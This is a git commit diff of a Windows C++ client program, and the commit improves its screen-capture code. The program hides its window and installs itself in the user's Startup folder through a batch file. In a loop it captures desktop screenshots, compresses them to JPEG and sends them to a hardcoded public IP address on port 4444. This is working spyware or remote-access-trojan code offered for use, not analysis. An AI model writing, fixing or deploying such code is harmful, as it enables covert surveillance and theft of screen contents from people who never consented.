8530d3f19f5ed52752381e1ca821f9c9399cda9e
kirilllolik23 <kiryshanice25@gmail.com>
2026-06-01 18:45:35 +0300

    fixed this time fully

--- client.cpp
+++ client.cpp
@@ -6,7 +6,6 @@
 #include <string>
 #include <thread>
 #include <fstream>
-
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
@@ -15,30 +14,30 @@ const char* SERVER1 = "212.35.189.7";
 const char* SERVER2 = "192.168.0.104";
 const int PORT = 4444;
 
-// ... the rest of your code (AddToStartup, SetVolume, PlayMP3, SendScreen, main)
-// remains exactly the same
-
 void AddToStartup() {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
-    
     std::string startup = std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
-    
     std::ofstream bat(startup);
     bat << "@echo off\nstart \"\" \"" << path << "\"";
     bat.close();
 }
 
-void SetVolume(float vol) {
-    // System volume control via key simulation (simple method)
-    HWND hwnd = GetForegroundWindow();
-    keybd_event(VK_VOLUME_UP, 0, 0, 0);
-    // Better method would require more code - this is basic
-}
-
-void PlayMP3(const char* file) {
-    mciSendStringA(("open \"" + std::string(file) + "\" type mpegvideo alias mp3").c_str(), NULL, 0, NULL);
-    mciSendStringA("play mp3", NULL, 0, NULL);
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0, size = 0;
+    Gdiplus::GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    Gdiplus::ImageCodecInfo* pCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
+    Gdiplus::GetImageEncoders(num, size, pCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pCodecInfo[j].Clsid;
+            free(pCodecInfo);
+            return j;
+        }
+    }
+    free(pCodecInfo);
+    return -1;
 }
 
 void SendScreen(SOCKET sock) {
@@ -46,55 +45,52 @@ void SendScreen(SOCKET sock) {
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
+    CLSID jpegClsid;
+    GetEncoderClsid(L"image/jpeg", &jpegClsid);
+
     while (true) {
         HWND hwnd = GetDesktopWindow();
         HDC hdc = GetDC(hwnd);
         RECT rect;
         GetClientRect(hwnd, &rect);
+        int w = rect.right, h = rect.bottom;
 
         HDC hdcMem = CreateCompatibleDC(hdc);
-        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
+        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
         SelectObject(hdcMem, hBitmap);
-        BitBlt(hdcMem, 0, 0, rect.right, rect.bottom, hdc, 0, 0, SRCCOPY);
+        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
 
-        BITMAPINFO bmi = {0};
-        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-        bmi.bmiHeader.biWidth = rect.right;
-        bmi.bmiHeader.biHeight = -rect.bottom;
-        bmi.bmiHeader.biPlanes = 1;
-        bmi.bmiHeader.biBitCount = 24;
-        bmi.bmiHeader.biCompression = BI_RGB;
-
-        // Fix: Calculate proper DWORD-aligned stride
-        int stride = ((rect.right * 24 + 31) / 32) * 4;
-        int size = stride * rect.bottom;
-        BYTE* buffer = new BYTE[size];
-        GetDIBits(hdcMem, hBitmap, 0, rect.bottom, buffer, &bmi, DIB_RGB_COLORS);
-
-        // Send size then data
-        send(sock, (char*)&size, 4, 0);
-        
-        // Fix: Send in chunks to handle large data properly
-        int sent = 0;
-        while (sent < size) {
-            int result = send(sock, (char*)buffer + sent, size - sent, 0);
-            if (result <= 0) {
-                delete[] buffer;
-                DeleteObject(hBitmap);
-                DeleteDC(hdcMem);
-                ReleaseDC(hwnd, hdc);
-                return;
-            }
-            sent += result;
-        }
-
-        delete[] buffer;
+        Gdiplus::Bitmap bitmap(hBitmap, NULL);
         DeleteObject(hBitmap);
         DeleteDC(hdcMem);
         ReleaseDC(hwnd, hdc);
 
+        IStream* pStream = NULL;
+        CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+        bitmap.Save(pStream, &jpegClsid, NULL);
+
+        STATSTG stat;
+        pStream->Stat(&stat, STATFLAG_NONAME);
+        ULONG jpegSize = stat.cbSize.LowPart;
+        BYTE* jpegData = new BYTE[jpegSize];
+        LARGE_INTEGER li = {};
+        pStream->Seek(li, STREAM_SEEK_SET, NULL);
+        ULONG bytesRead;
+        pStream->Read(jpegData, jpegSize, &bytesRead);
+        pStream->Release();
+
+        send(sock, (char*)&jpegSize, 4, 0);
+        int totalSent = 0;
+        while (totalSent < (int)jpegSize) {
+            int sent = send(sock, (char*)jpegData + totalSent, jpegSize - totalSent, 0);
+            if (sent <= 0) break;
+            totalSent += sent;
+        }
+        delete[] jpegData;
+
         Sleep(180);
     }
+    Gdiplus::GdiplusShutdown(gdiplusToken);
 }
 
 int main() {
@@ -104,11 +100,9 @@ int main() {
 
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     sockaddr_in addr;
-    
-    // Try public first, then private
     addr.sin_family = AF_INET;
     addr.sin_port = htons(PORT);
-    
+
     if (inet_pton(AF_INET, SERVER1, &addr.sin_addr) <= 0) {
         inet_pton(AF_INET, SERVER2, &addr.sin_addr);
     }
